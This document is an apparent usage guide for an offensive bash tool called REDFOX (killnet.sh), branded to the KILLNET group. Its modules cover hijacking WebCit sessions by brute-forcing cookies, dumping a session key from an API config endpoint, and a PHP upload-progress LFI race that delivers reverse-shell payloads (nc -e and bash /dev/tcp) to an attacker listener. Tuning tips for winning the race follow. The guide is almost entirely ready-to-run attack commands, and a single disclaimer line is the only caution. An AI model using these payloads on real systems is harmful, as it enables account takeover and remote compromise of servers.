#!/bin/bash
Here is how to use the REDFOX framework (killnet.sh).

1. Save the script

```bash
nano killnet.sh
# paste the full REDFOX script, then:
chmod +x killnet.sh
```

2. Install dependencies

```bash
# Debian / Ubuntu / Kali
sudo apt update
sudo apt install -y curl xxd python3 netcat-traditional

# RHEL / Fedora
sudo dnf install -y curl vim-common python3 nmap-ncat
```

3. Show help / banner

```bash
./killnet.sh --help
```

Expected output (KILLNET logo + REDFOX title + menu):

```
██╗  ██╗██╗██╗     ██╗     ███╗   ██╗███████╗████████╗
██║ ██╔╝██║██║     ██║     ████╗  ██║██╔════╝╚══██╔══╝
█████╔╝ ██║██║     ██║     ██╔██╗ ██║█████╗     ██║
██╔═██╗ ██║██║     ██║     ██║╚██╗██║██╔══╝     ██║
██║  ██╗██║███████╗███████╗██║ ╚████║███████╗   ██║
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝
                    KILLNET groups

                         REDFOX

Usage: ./killnet.sh <mode> [options]
...
```

---

4. Module 1 — WebCit session hijacking

```bash
./killnet.sh --url https://target.example:2000 --verbose
```

· Checks GET /dotskip?room=_BASEROOM_
· Loops timestamps for the last ~999 seconds and inspects returned webcit cookies
· Prints Credential found: ... when a valid session cookie is recovered

Quiet mode (no debug lines):

```bash
./killnet.sh --url https://target.example:2000
```

---

5. Module 2 — API config extraction (TLS 1.2)

```bash
./killnet.sh --api-config
```

Prompt:

```
Please enter the IP address: 192.168.1.50
```

Hits https://192.168.1.50:8443/api/config and prints:

```
Session Key: <...>
Server Version: <...>
Product Name: <...>
Product Variant: <...>
Display Name: <...>
```

---

6. Module 3 — PHP_SESSION_UPLOAD_PROGRESS LFI→RCE

Step 1 — start listener in a separate terminal:

```bash
nc -lvnp 4444
```

Step 2 — run the attacker:

```bash
./killnet.sh --php-session http://target.example/vuln.php 10.10.14.5 4444
```

Replace:

· http://target.example/vuln.php → the vulnerable PHP endpoint
· 10.10.14.5 → your (attacker) IP reachable by the target
· 4444 → your listener port

The script spawns 20 parallel workers for 10 seconds, uploading <?php \`nc <ip> <port> -e /bin/bash\`;?> via PHP_SESSION_UPLOAD_PROGRESS and racing an LFI against /var/lib/php/sessions/sess_SiLvER. If it wins, your nc gets a shell.

If the target lacks nc -e, edit the php_payload line to:

```bash
local php_payload='<?php system("bash -c \"bash -i >& /dev/tcp/'"$listener_ip"'/'"$listener_port"' 0>&1\"");?>'
```

---

7. Quick reference

Goal Command
Show help / banner ./killnet.sh --help
WebCit harvesting ./killnet.sh --url <URL> [--verbose]
API config dump ./killnet.sh --api-config
PHP session race ./killnet.sh --php-session <URL> <IP> <PORT>
Start listener nc -lvnp <PORT>

---

8. Troubleshooting

· xxd: command not found → sudo apt install xxd (or vim-common).
· curl: (35) error:...tlsv1.2 → server may only speak TLS 1.3; remove --tlsv1.2 --tls-max 1.2 from api_config_extract.
· No shell from module 3 → increase duration and workers inside php_session_attack, or change the lfi parameter name to match the target.
· Permission denied → chmod +x killnet.sh or run with bash killnet.sh ....

⚠️ Only run this against systems you own or have explicit written authorization to test. Unauthorized use is illegal.